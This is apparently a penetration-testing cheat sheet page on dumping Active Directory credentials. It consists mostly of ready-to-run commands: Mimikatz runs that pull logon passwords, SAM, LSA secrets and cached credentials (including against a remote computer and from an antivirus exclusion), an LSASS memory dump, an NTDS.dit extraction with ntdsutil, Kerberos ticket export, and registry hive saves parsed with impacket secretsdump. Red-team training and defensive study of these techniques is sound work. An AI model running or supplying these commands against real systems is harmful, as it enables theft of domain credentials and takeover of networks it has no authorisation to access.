---
description: Dumping AD Password Hashes
---

# Dump Password Hashes

> Since implementation of Kerberos authentication, password hashes must be stored somewhere in memory (in order to renew TGT requests). In modern Windows versions hashes are stored in the LSASS memory space.

## Mimikatz

We can use mimikatz (from an administrative console) to gain access to the hashes stored on the target.

**Note:** In order to avoid mimikatz as standalone application, we can try to execute it directly from memory or built-in tools like Task Manager to dump the entire LSASS process memory and extract the data from another machine.

### Extract full credentials using the ".ps1"

Load the script in-memory:&#x20;

```powershell
. .\Invoke-Mimikatz.ps1
```

Then:

{% code overflow="wrap" %}
```powershell
#Delete -ComputerName if we want to dump creds from the current machine
Invoke-Mimikatz -Command '"log C:\mim.log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam /patch" "lsadump::lsa /patch" "lsadump::cache" "lsadump::secrets" "dpapi::cache" "vault::cred /patch"' -ComputerName $COMPUTER_NAME 
```
{% endcode %}

This will save the output in "C:\mimi.log".

### Extract full credentials using "mimikatz.exe"

Upload the .exe file into an AV exception, then:

{% code overflow="wrap" %}
```powershell
PS> .\mimi.exe "log C:\mim.log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam /patch" "lsadump::lsa /patch" "lsadump::cache" "lsadump::secrets" "dpapi::cache" "vault::cred /patch" "exit"
```
{% endcode %}

### Extract credentials by dumping LSASS.exe manually

If we are Administrator, we can dump the LSASS.exe process manually if we have an RDP connection:

<figure><img src="../../.gitbook/assets/lsass_dump.png" alt=""><figcaption></figcaption></figure>

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">#Grab the "lsass.DMP" file to our machine and use mimikatz to extract creds:
. .\Invoke-Mimikatz.ps1
<strong>
</strong><strong>Invoke-Mimikatz -Command '"sekurlsa::minidump C:\Users\user\Desktop\lsass.DMP" "sekurlsa::logonPasswords"'
</strong></code></pre>

### Dump NDTS.dit using ntdsutil

A way to dump NTDS.dit from DC without using any external tool:

{% code overflow="wrap" %}
```bash
c:\> ntdsutil
ntdsutil: active instance ntds
ntdsutil: ifm
ifm: create full c:\test\test
ifm: quit
ntdsutil: quit

#Dump passwords locally:
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit local
```
{% endcode %}

### Users Logged On TGT & TGS Tickets

Extract TGT & TGS Kerberos tickets.

```
C:\> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets
```

## SAM & SYSTEM files (local)

### From local machine

```powershell
reg save hklm\sam c:\sam.save
reg save hklm\system c:\system.save
reg save hklm\security c:\security.save
```

### From attacker machine

{% code overflow="wrap" %}
```
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```
{% endcode %}
